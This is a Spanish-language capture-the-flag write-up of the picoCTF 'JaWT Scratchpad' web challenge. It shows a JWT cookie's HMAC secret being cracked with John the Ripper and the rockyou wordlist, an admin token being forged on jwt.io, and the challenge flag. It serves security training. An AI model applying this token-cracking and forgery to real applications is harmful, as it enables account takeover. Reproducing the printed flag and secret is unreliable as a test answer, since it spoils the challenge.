# JaWT Scratchpad
## Objetivo
heck the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Soluciòn
Al dar click a la link que nos dan entramos a una pàgina en donde debemos poner algùn usuario, despues nos redirige a otra pàgina, en la cual te da la bienvenida y hay un recuadro de texto, el cual debe estar vacìo.
Con ayuda de la estencion de Cookies Editor, que ya usamos anteriormente en otros retos, vamos a copiar la cookie que se llama "jwt", en al consola creamos un archivo que se llame token u otro nombre, en donde vamos a pegar la cookie, con cat nos aseguramos de que està la cookie en el archivo.
Ahora vamos a ver si tenemos algunas palabras clave que nos ayudaràn a entrar a la pagina en la que nos loggeamos como si fuesemos admin, ya que ahì vaos a encontrar la flag.  Esas palabras clave se encuentran en el directorio /usr/share/wordlists  en un zip llamado rockyou.txt.gz, ese zip lo vamos a extraer y vamos a leer el txt que venìa dentro. y ahora con ayuda del comando john vamos a ver cual palabra clave nos ayuda a editar la cookie para poder acceder como admin.

En una pàgina llamada jwt.io vamos a editar la cookie que obtuvimos al principio, pegamos, editamos el user a admin y en la parte de abajo, hay codigo en color azul, hay un espacio que podeos editar, borramos el contenido y podemos la palabra que nos dioen la consola gracias al comando jonh. 
La cookie irà cambiando conforme vayamos editando, cuando ya hayamos hecho el proceso descrito arriba, copiamos la cookie resultante, vamos a la pàgina en la que loggeamos, editamos la cookie sin hacer logout, y pegamos la nueva cookie, guardamos y recargamos la pàgina, como resultado, en el cuadro de texto que antes estaba vacìo ahora contiene la flag para este reto.

```shell
┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ nano token

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ cat token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYW5kcmVhX2Nhc3RybyJ9.ZUMVTEEVeroX9o9ZfMIY-g95-3uLKG3QKf7_YygSBiI

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ ls /usr/share/wordlists 
amass  dirbuster      fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
[sudo] password for kali: 

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ ls /usr/share/wordlists                         
amass  dirbuster      fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
   
┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ sudo apt install john
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
john is already the newest version (1.9.0-Jumbo-1+git20211102-0kali3+b1).
john set to manually installed.
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ john
Created directory: /home/kali/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ john token -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:16 DONE (2022-10-07 17:09) 0.05924g/s 438111p/s 438111c/s 438111C/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/…/CarpetaCompartida.Windows/RetosKali-exam--editar/CarpetaKali-exam1/Retos-Web picoCTF 2019]
└─$ 
```
picoCTF{jawt_was_just_what_you_thought_44c752f5}

## Referencias
- []()